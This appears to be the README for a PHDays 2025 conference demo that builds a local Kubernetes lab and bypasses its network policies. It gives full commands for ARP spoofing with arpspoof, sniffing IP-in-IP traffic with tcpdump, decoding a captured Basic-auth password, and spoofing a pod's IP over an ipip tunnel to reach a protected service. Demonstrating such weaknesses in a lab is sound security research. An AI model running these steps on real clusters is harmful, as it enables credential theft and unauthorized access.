PHDays 2025 Demo
================

Requirements
------------

- macOS/ARM
- [Docker Desktop](https://docs.docker.com/desktop/setup/install/mac-install/)
- [Packer v1.12](https://developer.hashicorp.com/packer/tutorials/docker-get-started/get-started-install-cli)
- [VirtualBox v7.1](https://www.virtualbox.org/wiki/Downloads)
- Python 3
- [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-macos/)

Setup
-----

Install required packages:

```sh
python -m venv .venv
. .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install --requirement=requirements.txt
ansible-galaxy collection install --requirements-file=requirements.yml
```

Add to `/etc/hosts`:

```
127.0.0.1 control-plane
```

Build images:

```sh
make debian
make malicious
```

Set up demo stand:

```sh
make gateway
make control-plane
make workers
```

Wait until all the pods are ready:

```sh
export KUBECONFIG=kubeconfig.yml

kubectl get pods --all-namespaces
```

Test network connectivity:

```sh
# HTTP/1.1 200 OK
kubectl exec private-app-client --namespace=alice -- \
    curl \
        --silent \
        --connect-timeout 3 \
        --netrc \
        --head \
        http://app.alice

# HTTP/1.1 401 Unauthorized
kubectl exec network-multitool --namespace=mallory -- \
    curl \
        --silent \
        --connect-timeout 3 \
        --head \
        http://app.alice
```

Apply network policies:

```sh
make networkpolicy
```

Test network connectivity:

```sh
# HTTP/1.1 200 OK
kubectl exec private-app-client --namespace=alice -- \
    curl \
        --silent \
        --connect-timeout 3 \
        --netrc \
        --head \
        http://app.alice

# failure (exit code: 28)
kubectl exec network-multitool --namespace=mallory -- \
    curl \
        --silent \
        --connect-timeout 3 \
        --head \
        http://app.alice
```

Demo
----

### Stage 1. Discover Alice Workload IP Addresses ###

Execute with host shell:

```sh
export KUBECONFIG=kubeconfig.yml

kubectl apply --filename=k8s/malicious.yml
kubectl exec malicious --namespace=mallory --stdin --tty -- bash
```

Execute with `mallory/malicious` pod shell:

```sh
arpspoof -i enp0s9 -t 192.168.78.12 192.168.78.11 2> /dev/null &
arpspoof -i enp0s9 -t 192.168.78.11 192.168.78.12 2> /dev/null &
tcpdump -i enp0s9 -Q in -n -A proto 4 and src 192.168.78.11
```

Execute with host shell:

```sh
kubectl exec private-app-client --namespace=alice -- \
    curl \
        --silent \
        --connect-timeout 3 \
        --netrc \
        --head \
        http://app.alice
```

Check `tcpdump` output (`mallory/malicious` pod shell). Compare with the
following addresses (execute with host shell):

```sh
kubectl get pods/private-app-client --namespace=alice --output='jsonpath={.status.podIP}'
kubectl get pods/private-app-server --namespace=alice --output='jsonpath={.status.podIP}'
```

Check `tcpdump` output (`mallory/malicious` pod shell). Decode `Authorization`
header value (execute with `mallory/malicious` pod shell):

```sh
echo YWxpY2U6UGEkJHcwckQ= | base64 -d ; echo
```

### Stage 2. Alice Workload Network Isolation Bypass ###

Execute with `mallory/malicious` pod shell:

```sh
# change to discovered addresses
alice_client_address=172.29.193.133
alice_server_address=172.29.109.5

alice_server_credentials=$(echo YWxpY2U6UGEkJHcwckQ= | base64 -d)

ip address add 192.168.78.11/24 dev enp0s9
ip link add ipspoof0 type ipip local 192.168.78.11 remote 192.168.78.12
ip link set dev ipspoof0 up
ip address add ${alice_client_address}/32 dev ipspoof0
ip route add ${alice_server_address}/32 dev ipspoof0

curl \
    --silent \
    --connect-timeout 3 \
    --user ${alice_server_credentials} \
    http://${alice_server_address}/
```

Cleanup
-------

```sh
make clean-all
```
